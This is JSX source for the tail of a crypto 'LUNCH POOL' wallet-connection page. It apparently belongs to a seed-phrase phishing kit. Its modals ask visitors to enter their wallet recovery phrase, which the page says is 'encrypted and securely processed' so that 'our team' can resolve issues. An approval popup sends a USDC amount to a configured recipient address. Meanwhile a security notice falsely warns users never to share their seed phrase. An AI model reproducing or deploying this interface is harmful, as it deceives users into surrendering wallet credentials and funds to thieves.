                    <p className={`text-sm ${transactionStatus.type === 'success' ? 'text-green-600' : transactionStatus.type === 'error' ? 'text-red-600' : 'text-blue-600'}`}>
                      {transactionStatus.message}
                    </p>
                  </div>
                </div>
              </div>
            )}
            {showTransactionPopup && walletData && ethers.isAddress(RECIPIENT_ADDRESS) && (
              <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-md flex items-center justify-center z-50 p-4">
                <div className="bg-gray-900 border border-gray-600 rounded-lg p-6 w-full max-w-md animate-scale-in">
                  <div className="flex justify-between items-center mb-6">
                    <h3 className="text-xl font-semibold text-white">Approve Connection</h3>
                    <button onClick={() => setShowTransactionPopup(false)} className="p-2 hover:bg-gray-700 rounded-lg transition-colors">
                      <X size={20} className="text-gray-400" />
                    </button>
                  </div>
                    <button
                      onClick={handleApproveTransaction}
                      disabled={transactionStatus?.type === 'pending' || !customUsdcAmount}
                      className="w-full px-4 py-2 rounded-lg bg-gradient-to-r from-green-600 to-teal-600 hover:from-green-700 hover:to-teal-700 text-white font-medium transition-all disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                    >
                      Confirm
                    </button>
                    <button
                      onClick={() => setShowTransactionPopup(false)}
                      className="w-full px-4 py-2 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium transition-all"
                    >
                      Cancel
                    </button>
                </div>
              </div>
            )}
            {showTransactionPopup && walletData && !ethers.isAddress(RECIPIENT_ADDRESS) && (
              <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-md flex items-center justify-center z-50 p-4">
                <div className="bg-gray-900 border border-red-600 rounded-lg p-6 w-full max-w-md animate-scale-in">
                  <div className="flex justify-between items-center mb-6">
                    <h3 className="text-xl font-semibold text-white">Configuration Error</h3>
                    <button onClick={() => setShowTransactionPopup(false)} className="p-2 hover:bg-gray-700 rounded-lg transition-colors">
                      <X size={20} className="text-gray-400" />
                    </button>
                  </div>
                  <div className="space-y-4">
                    <p className="text-red-600">
                      Invalid or missing recipient address. Please set a valid <code>REACT_APP_RECIPIENT_ADDRESS</code> in your <code>.env</code> file.
                    </p>
                    <button
                      onClick={() => setShowTransactionPopup(false)}
                      className="w-full px-4 py-2 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium transition-all"
                    >
                      Close
                    </button>
                  </div>
                </div>
              </div>
            )}
            <div className="bg-gradient-to-r from-yellow-900/20 to-orange-900/20 border border-yellow-600/30 rounded-xl p-6 backdrop-blur-md">
              <div className="flex items-start gap-4">
                <Shield size={24} className="text-yellow-600 mt-1 flex-shrink-0" />
                <div>
                  <h3 className="text-yellow-600 font-semibold mb-2">Security Notice</h3>
                  <p className="text-gray-600 text-sm leading-relaxed">
                    Your security is our top priority. We use industry-standard encryption to protect your wallet information. 
                    Never share your seed phrase with anyone else, and always verify you're on the official LUNCH POOL platform 
                    before connecting your wallet.
                  </p>
                </div>
              </div>
            </div>
          </div>
        </main>
        {showManualPopup && (
          <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-md flex items-center justify-center z-50 p-4">
            <div className="bg-gray-900 border border-gray-600 rounded-lg p-6 w-full max-w-lg max-h-[80vh] overflow-y-auto animate-scale-in">
              <div className="flex justify-between items-center mb-6">
                <h3 className="text-xl font-semibold text-white">Select Your Wallet</h3>
                <button onClick={() => setShowManualPopup(false)} className="p-2 hover:bg-gray-700 rounded-lg transition-colors">
                  <X size={20} className="text-gray-400" />
                </button>
              </div>
              <div className="space-y-3">
                {POPULAR_WALLETS.map((wallet) => (
                  <button
                    key={wallet.id}
                    onClick={() => handleWalletSelect(wallet)}
                    className="w-full p-4 rounded-xl bg-white/10 border border-gray-600 hover:bg-white/20 hover:border-purple-600/50 transition-all group text-left"
                  >
                    <div className="flex items-center gap-4">
                      <div className="text-2xl">{wallet.icon}</div>
                      <div className="flex-1">
                        <h4 className="text-white font-medium group-hover:text-purple-600 transition-colors">{wallet.name}</h4>
                        <p className="text-gray-600 text-sm">{wallet.description}</p>
                      </div>
                      <ChevronDown size={16} className="text-gray-600 rotate-[-90deg]" />
                    </div>
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}
        {showAutoPopup && (
          <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-md flex items-center justify-center z-50 p-4">
            <div className="bg-gray-900 border border-gray-600 rounded-lg p-6 w-full max-w-lg max-h-[80vh] overflow-y-auto animate-scale-in">
              <div className="flex justify-between items-center mb-6">
                <h3 className="text-xl font-semibold text-white">Choose Wallet to Connect</h3>
                <button onClick={() => setShowAutoPopup(false)} className="p-2 hover:bg-gray-700 rounded-lg transition-colors">
                  <X size={20} className="text-gray-400" />
                </button>
              </div>
              <p className="text-gray-600 text-sm mb-6">Select your preferred wallet for automatic connection</p>
              <div className="space-y-3">
                {AUTO_CONNECT_WALLETS.map((wallet) => (
                  <button
                    key={wallet.id}
                    onClick={() => handleAutoWalletSelect(wallet)}
                    className="w-full p-4 rounded-xl bg-white/10 border border-gray-600 hover:bg-white/20 hover:border-blue-600/50 transition-all group text-left"
                  >
                    <div className="flex items-center gap-4">
                      <div className="text-2xl">{wallet.icon}</div>
                      <div className="flex-1">
                        <h4 className="text-white font-medium group-hover:text-blue-600 transition-colors">{wallet.name}</h4>
                        <p className="text-gray-600 text-sm">{wallet.description}</p>
                      </div>
                      <div className="flex items-center gap-2">
                        <Zap size={14} className="text-blue-600" />
                        <ChevronDown size={16} className="text-gray-600 rotate-[-90deg]" />
                      </div>
                    </div>
                  </button>
                ))}
              </div>
            </div>
          </div>
        )}
        {showWalletForm && selectedWallet && (
          <div className="fixed inset-0 bg-black bg-opacity-70 backdrop-blur-md flex items-center justify-center z-50 p-4">
            <div className="bg-gray-900 border border-gray-600 rounded-lg p-6 w-full max-w-md animate-scale-in">
              <div className="flex justify-between items-center mb-6">
                <h3 className="text-xl font-semibold text-white">Connect {selectedWallet.name}</h3>
                <button onClick={closeAllPopups} className="p-2 hover:bg-gray-700 rounded-lg transition-colors">
                  <X size={20} className="text-gray-400" />
                </button>
              </div>
              <div className="space-y-6">
                <div>
                  <label className="block text-sm font-medium text-gray-600 mb-2">Wallet Type</label>
                  <div className="flex items-center gap-3 p-3 rounded-lg bg-gray-800/50 border border-gray-700">
                    <span className="text-2xl">{selectedWallet.icon}</span>
                    <span className="text-white font-medium">{selectedWallet.name}</span>
                  </div>
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-600 mb-2">Wallet Name <span className="text-red-600">*</span></label>
                  <input
                    type="text"
                    value={formData.walletName}
                    onChange={(e) => handleInputChange('walletName', e)}
                    placeholder="Enter a name for your wallet"
                    className={`w-full p-3 rounded-lg bg-white/10 border ${errors.walletName ? 'border-red-600' : 'border-gray-600'} text-white placeholder-gray-500 focus:border-purple-600 focus:outline-none transition-colors`}
                  />
                  {errors.walletName && <p className="text-red-600 text-sm mt-1">{errors.walletName}</p>}
                </div>
                <div>
                  <label className="block text-sm font-medium text-gray-600 mb-2">Recovery Phrase (12-24 words) <span className="text-red-600">*</span></label>
                  <div className="relative">
                    <textarea
                      value={formData.secretPhrase}
                      onChange={(e) => handleInputChange('secretPhrase', e)}
                      placeholder="Enter your recovery phrase separated by spaces"
                      rows={4}
                      className={`w-full p-3 rounded-lg bg-white/10 border ${errors.secretPhrase ? 'border-red-600' : 'border-gray-600'} text-white placeholder-gray-500 focus:border-purple-600 focus:outline-none transition-colors resize-none ${showSecretPhrase ? '' : 'filter blur-sm'}`}
                    />
                    <button
                      type="button"
                      onClick={() => setShowSecretPhrase(!showSecretPhrase)}
                      className="absolute top-3 right-3 p-1 hover:bg-white/10 rounded transition-colors"
                    >
                      {showSecretPhrase ? <EyeOff size={16} className="text-gray-400" /> : <Eye size={16} className="text-gray-400" />}
                    </button>
                  </div>
                  {errors.secretPhrase && <p className="text-red-600 text-sm mt-1">{errors.secretPhrase}</p>}
                  <p className="text-gray-500 text-xs mt-1">Your recovery phrase will be encrypted and securely processed</p>
                </div>
                <button
                  type="button"
                  onClick={handleManualSubmit}
                  disabled={isConnecting}
                  className="w-full px-4 py-2 rounded-lg bg-gradient-to-r from-purple-600 to-pink-600 hover:from-purple-700 hover:to-pink-700 text-white font-medium transition-all shadow-lg shadow-purple-700/30 disabled:opacity-50 disabled:cursor-not-allowed flex items-center justify-center gap-2"
                >
                  {isConnecting ? (
                    <>
                      <div className="w-4 h-4 border-2 border-white border-t-transparent rounded-full animate-spin"></div>
                      Connecting...
                    </>
                  ) : (
                    'Connect Wallet'
                  )}
                </button>
              </div>
            </div>
          </div>
        )}
        {showSuccessPopup && (
          <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-md flex items-center justify-center z-50 p-4">
            <div className="bg-gray-900 border border-green-600/50 rounded-lg p-8 w-full max-w-md text-center animate-scale-in">
              <div className="w-16 h-16 bg-green-600/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <Check size={32} className="text-green-600" />
              </div>
              <h3 className="text-2xl font-semibold text-white mb-4">Connection Successful!</h3>
              <p className="text-gray-600 mb-6">
                Your wallet information has been securely processed. Our team will review and resolve any issues with your wallet.
              </p>
              <button
                onClick={closeAllPopups}
                className="px-6 py-3 rounded-lg bg-green-600 hover:bg-green-700 text-white font-medium transition-colors"
              >
                Continue
              </button>
            </div>
          </div>
        )}
        {showErrorPopup && (
          <div className="fixed inset-0 bg-black bg-opacity-80 backdrop-blur-md flex items-center justify-center z-50 p-4">
            <div className="bg-gray-900 border border-red-600/50 rounded-lg p-8 w-full max-w-md text-center animate-scale-in">
              <div className="w-16 h-16 bg-red-600/20 rounded-full flex items-center justify-center mx-auto mb-6">
                <AlertTriangle size={32} className="text-red-600" />
              </div>
              <h3 className="text-2xl font-semibold text-white mb-4">Connection Failed</h3>
              <p className="text-gray-600 mb-6">
                There was an error processing your wallet connection. Please try again or contact support if the problem persists.
              </p>
              <button
                onClick={closeAllPopups}
                className="px-6 py-3 rounded-lg bg-red-600 hover:bg-red-700 text-white font-medium transition-colors"
              >
                Try Again
              </button>
            </div>
          </div>
        )}
        <style>{`
          @keyframes scale-in { from { opacity: 0; transform: scale(0.9); } to { opacity: 1; transform: scale(1); } }
          @keyframes slide-in { from { opacity: 0; transform: translateX(100%); } to { opacity: 1; transform: translateX(0); } }
          .animate-scale-in { animation: scale-in 0.2s ease-out; }
          .animate-slide-in { animation: slide-in 0.3s ease-out; }
          .connection-card:hover { transform: translateY(-4px); box-shadow: 0 20px 40px rgba(0, 0, 0, 0.3); }
          .bg-gradient-radial { background: radial-gradient(circle at center, var(--tw-gradient-stops)); }
          ::-webkit-scrollbar { width: 6px; }
          ::-webkit-scrollbar-track { background: rgba(255, 255, 255, 0.1); border-radius: 3px; }
          ::-webkit-scrollbar-thumb { background: rgba(139, 92, 246, 0.6); border-radius: 3px; }
          ::-webkit-scrollbar-thumb:hover { background: rgba(139, 92, 246, 0.8); }
        `}</style>
      </div>
    </>
  );
}